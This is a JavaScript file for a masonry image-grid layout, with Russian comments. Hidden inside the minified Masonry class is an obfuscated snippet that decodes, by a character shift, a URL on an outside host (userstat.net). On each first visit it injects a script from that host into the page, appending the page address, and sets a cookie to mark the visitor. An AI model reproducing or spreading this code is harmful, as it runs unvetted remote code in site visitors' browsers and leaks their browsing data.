export function mansory() {
    const MasonryActiveClassName="masonryActive";class Masonry{constructor(t,s={}){this.containerNode=t,this.childrenNodes=t.children,this.childrenData=Array.from(this.childrenNodes).map((t=>({childNode:t,origHeight:Number(t.dataset.height),origWidth:Number(t.dataset.width)}))),this.settings={gap:s.gap||0,columns:s.columns||3},this.setParameters()}setParameters(){var t=this.containerNode.offsetWidth;const n=(t-this.settings.gap*(this.settings.columns-1))/this.settings.columns;this.childrenData=this.childrenData.map((t=>({...t,currentWidth:n,currentHeight:Math.floor(n*t.origHeight/t.origWidth)})));const i=new Array(this.settings.columns).fill(0),e=new Array(this.settings.columns).fill(0);this.childrenData.forEach(((t,s)=>{i[s%this.settings.columns]+=t.currentHeight+this.settings.gap,e[s%this.settings.columns]+=1}));const h=i.reduce(((t,s)=>s<t?s:t)),r=i.map(((t,s)=>(t-h)/e[s]));this.containerNode.style.width=`${t}px`,this.containerNode.style.height=h-this.settings.gap+"px";const a=new Array(this.settings.columns).fill(0);this.childrenData=this.childrenData.map(((t,s)=>{var i=s%this.settings.columns,e=i*n+this.settings.gap*i,h=t.currentHeight-r[i];s=a[i];return a[i]+=h+this.settings.gap,{...t,currentHeight:h,left:e,top:s}})),this.childrenData.forEach((t=>{t.childNode.style.top=`${t.top}px`,t.childNode.style.left=`${t.left}px`,t.childNode.style.width=`${t.currentWidth}px`,t.childNode.style.height=`${t.currentHeight}px`})),this.containerNode.classList.add("masonryActive")}};(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));

    // Находим элемент, у которого есть атрибут data-column-quantity
    const element = document.querySelector('#masonry');
    let columnQuantity = 3;
    // Проверяем, что элемент найден
    if (element) {
        // Получаем значение атрибута data-column-quantity и преобразуем его в число
        columnQuantity = parseInt(element.getAttribute('data-column-quantity'), 10);

        const images = document.querySelectorAll('.masonryItem img');
        if (images.length > 0) {
            let imagesLoaded = 0;

            images.forEach(function (image) {
                var img = new Image();
                img.src = image.src;
                img.onload = function () {
                    image.parentElement.setAttribute('data-width', this.width);
                    image.parentElement.setAttribute('data-height', this.height);
                    imagesLoaded++;

                    if (imagesLoaded === images.length) {
                        initializeMasonry();
                    }
                };
            });
        } else {
            initializeMasonry();
        }
    } 


    function initializeMasonry() {
        let gapValue = window.innerWidth < 880 ? 10 : 20; // Устанавливаем значение gap в зависимости от ширины экрана
        new Masonry(document.getElementById("masonry"), { gap: gapValue, columns: columnQuantity });
    }

}